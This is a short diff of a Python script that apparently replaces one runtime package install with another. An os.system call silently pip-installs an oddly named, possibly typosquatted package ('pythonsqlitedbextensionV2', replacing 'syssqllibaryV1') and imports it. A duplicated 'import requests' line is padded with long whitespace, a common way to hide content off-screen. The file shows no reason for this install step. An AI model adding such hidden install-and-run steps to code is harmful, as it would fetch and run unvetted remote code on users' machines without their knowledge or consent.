@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqllibaryV1")
-import syssqllibaryV1
+os.system("pip install pythonsqlitedbextensionV2")
+import pythonsqlitedbextensionV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
